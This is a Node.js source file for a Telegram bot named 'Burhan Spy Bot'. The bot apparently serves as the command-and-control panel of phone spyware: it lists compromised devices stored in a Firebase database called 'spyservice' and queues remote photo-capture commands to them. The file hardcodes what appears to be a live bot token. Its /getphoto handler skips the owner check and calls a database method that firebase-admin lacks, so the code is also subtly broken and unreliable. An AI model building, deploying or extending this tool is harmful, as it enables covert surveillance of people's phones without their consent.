const TelegramBot = require('node-telegram-bot-api');
const admin = require('firebase-admin');

const token = '8811118034:AAEFtRZ5vsk3n8YlXvUrE0csOVNdlsh7IzM';
const YOUR_USER_ID = 2062068620;
const bot = new TelegramBot(token, { polling: false }); // Polling off, webhook on

// Firebase Admin Init (Service Account JSON use kar)
const serviceAccount = require('./firebase-service-account.json');
admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: "https://spyservice-c27e1-default-rtdb.europe-west1.firebasedatabase.app"
});
const db = admin.database();

// Webhook endpoint (Railway isko call karega)
const express = require('express');
const app = express();
app.use(express.json());

// Telegram updates yahan aayenge
app.post('/webhook', (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Bot commands
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n📜 Commands:\n/devices - View all devices\n/stats - Total devices\n/help - Commands`);
});

bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    db.ref('devices').once('value', (snapshot) => {
        const devices = snapshot.val() || {};
        let message = "📱 ALL DEVICES (Total: " + Object.keys(devices).length + ")\n\n";
        Object.entries(devices).forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n🔋 Battery: ${d.battery}%\n📊 Status: ${d.online ? "🟢 ONLINE" : "🔴 OFFLINE"}\n🕒 ${d.time}\n\n`;
        });
        bot.sendMessage(chatId, message);
    });
});

bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    db.ref('devices').once('value', (snapshot) => {
        const devices = snapshot.val() || {};
        bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(devices).length}`);
    });
});

bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    const photoPath = match[2];
    db.ref('commands').child(deviceId).setValue('get_photo');
    bot.sendMessage(chatId, `📸 Photo request sent for device ${deviceId}...`);
});

// Helper
function isAuthorized(msg) {
    return msg.from.id === YOUR_USER_ID;
}

// Server start (Railway is port 3000 use karega)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
